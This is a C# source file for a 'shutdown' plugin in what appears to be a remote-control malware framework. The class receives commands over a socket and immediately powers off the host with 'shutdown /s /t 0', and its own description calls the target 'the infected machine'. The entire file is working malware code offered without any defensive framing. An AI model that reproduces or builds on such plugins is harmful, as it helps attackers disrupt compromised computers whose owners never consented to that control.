using Common.Attributes;
using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.Serialization;

namespace Common.Commands.Executer_Commands
{
    [Serializable]
    [CommandName("shutdown")]
    public class ShutDown_Command : Executer
    {
        public void Execute(Socket sendTo)
        {
            try
            {
                Process.Start("shutdown", "/s /t 0");
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing shutdown command!\n{0}", ex.ToString());
            }
        }

        public void PrintDescription()
        {
            Console.WriteLine("This plugin will shut down the infected machine");
        }
    }
}
